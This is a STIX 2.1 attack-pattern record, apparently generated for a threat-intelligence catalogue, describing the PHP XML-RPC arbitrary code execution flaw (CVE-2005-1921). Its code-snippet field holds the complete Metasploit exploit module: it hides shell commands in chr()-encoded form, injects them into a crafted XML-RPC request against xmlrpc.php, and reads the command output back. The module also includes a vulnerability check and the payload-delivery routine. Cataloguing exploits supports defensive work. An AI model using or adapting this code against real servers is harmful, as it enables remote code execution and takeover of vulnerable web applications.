{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ffcfc5bf-11dd-44ca-a3af-f630504787cd",
    "created": "2024-08-14T17:12:53.355902Z",
    "modified": "2024-08-14T17:12:53.355906Z",
    "name": "PHP XML-RPC Arbitrary Code Execution",
    "description": " This module exploits an arbitrary code execution flaw discovered in many implementations of the PHP XML-RPC module. This flaw is exploitable through a number of PHP web applications, including but not limited to Drupal, Wordpress Postnuke, and TikiWiki. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/php_xmlrpc_eval.rb",
            "external_id": "php_xmlrpc_eval.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1921"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  # XXX This module needs an overhaul\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PHP XML-RPC Arbitrary Code Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary code execution flaw\n        discovered in many implementations of the PHP XML-RPC module.\n        This flaw is exploitable through a number of PHP web\n        applications, including but not limited to Drupal, Wordpress,\n        Postnuke, and TikiWiki.\n      },\n      'Author'         => [ 'hdm', 'cazz' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-1921'],\n          ['OSVDB', '17793'],\n          ['BID', '14088'],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Payload'        => {\n          'Space' => 512,\n          'DisableNops' => true,\n          'Keys'  => ['cmd', 'cmd_bash'],\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2005-06-29'\n      ))\n\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"Path to xmlrpc.php\", '/xmlrpc.php']),\n      ])\n\n    deregister_options(\n      'HTTP::junk_params', # not your typical POST, so don't inject params.\n      'HTTP::junk_slashes' # For some reason junk_slashes doesn't always work, so turn that off for now.\n      )\n  end\n\n  def go(command)\n\n    encoded = command.unpack(\"C*\").collect{|x| \"chr(#{x})\"}.join('.')\n    wrapper = rand_text_alphanumeric(rand(128)+32)\n\n    cmd = \"echo('#{wrapper}'); passthru(#{ encoded }); echo('#{wrapper}');;\"\n\n    xml =\n    '<?xml version=\"1.0\"?>' +\n    \"<methodCall>\" +\n      \"<methodName>\"+ rand_text_alphanumeric(rand(128)+32) + \"</methodName>\" +\n      \"<params><param>\" +\n        \"<name>\" + rand_text_alphanumeric(rand(128)+32) + \"');#{cmd}//</name>\" +\n        \"<value>\" + rand_text_alphanumeric(rand(128)+32) + \"</value>\" +\n      \"</param></params>\" +\n    \"</methodCall>\";\n\n    res = send_request_cgi({\n        'uri'          => normalize_uri(datastore['PATH']),\n        'method'       => 'POST',\n        'ctype'        => 'application/xml',\n        'data'         => xml,\n      }, 5)\n\n    if (res and res.body)\n      b = /#{wrapper}(.*)#{wrapper}/sm.match(res.body)\n      if b\n        return b.captures[0]\n      elsif datastore['HTTP::chunked']\n        b = /chunked Transfer-Encoding forbidden/.match(res.body)\n        if b\n          fail_with(Failure::BadConfig, 'Target PHP installation does not support chunked encoding. Support for chunked encoded requests was added to PHP on 12/15/2005. Try disabling HTTP::chunked and trying again.')\n        end\n      end\n    end\n\n    return nil\n  end\n\n  def check\n    response = go(\"echo ownable\")\n    if (!response.nil? and response =~ /ownable/sm)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    response = go(payload.encoded)\n    if response == nil\n      print_error('exploit failed: no response')\n    else\n      if response.length == 0\n        print_good('Exploit Successful')\n      else\n        print_status(\"Command returned #{response}\")\n      end\n      handler\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-06-29",
    "x_mitre_platforms": [
        "['unix']"
    ]
}